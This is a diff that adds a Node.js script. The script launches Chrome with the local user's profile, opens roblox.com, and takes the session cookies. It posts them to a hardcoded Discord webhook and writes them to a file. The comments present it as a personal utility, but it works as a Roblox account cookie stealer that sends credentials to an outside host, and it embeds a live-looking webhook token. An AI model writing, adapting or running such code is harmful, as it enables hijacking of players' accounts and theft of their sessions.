@@ -1,0 +1,50 @@
+const puppeteer = require('puppeteer-core');
+const axios = require('axios');
+const fs = require('fs');
+
+// Replace with your actual Discord Webhook URL
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1330616566857072742/qwmUfJoIlFnSK1UmMp90Aa2DP5RAJiotQCaHahu3Iw3xVw34OobZSmHY0CuphvnfjkDa";
+
+// Path to your existing Chrome installation (Change this for macOS or Linux)
+const CHROME_PATH = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+
+// Function to send cookies to Discord
+async function sendToDiscord(cookies) {
+    try {
+        const formattedCookies = JSON.stringify(cookies, null, 2);
+        await axios.post(DISCORD_WEBHOOK_URL, {
+            content: `\`\`\`json\n${formattedCookies}\n\`\`\``
+        });
+    } catch (error) {
+        console.error("Failed to send to Discord:", error);
+    }
+}
+
+(async () => {
+    const browser = await puppeteer.launch({
+        executablePath: CHROME_PATH, // Use existing Chrome
+        headless: false, // Show the browser window
+        userDataDir: "C:\\Users\\YOUR_USERNAME\\AppData\\Local\\Google\\Chrome\\User Data", // Use your Chrome profile
+        args: ['--remote-debugging-port=9222'] // Enable debugging
+    });
+
+    const pages = await browser.pages();
+    const page = pages.length ? pages[0] : await browser.newPage();
+
+    // Navigate to Roblox to get cookies
+    await page.goto('https://www.roblox.com/', { waitUntil: 'networkidle2' });
+
+    // Extract cookies
+    const cookies = await page.cookies();
+    console.log("Cookies Captured:", cookies);
+
+    // Send cookies to Discord
+    sendToDiscord(cookies);
+
+    // Save cookies to a file
+    fs.writeFileSync('roblox_cookies.json', JSON.stringify(cookies, null, 2));
+
+    console.log("Captured cookies saved to 'roblox_cookies.json'");
+
+    await browser.close();
+})();
